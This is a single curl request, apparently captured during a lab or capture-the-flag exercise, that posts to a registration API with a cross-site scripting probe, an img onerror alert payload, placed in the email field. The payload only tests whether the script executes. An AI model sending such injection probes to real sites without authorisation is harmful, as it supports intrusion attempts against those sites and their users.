curl 'http://83.136.255.150:34245/api/register' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://83.136.255.150:34245' \
  -H 'Referer: http://83.136.255.150:34245/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' \
  --data-raw '{"email":"<img src=x onerror=alert();>"}' \
  --insecure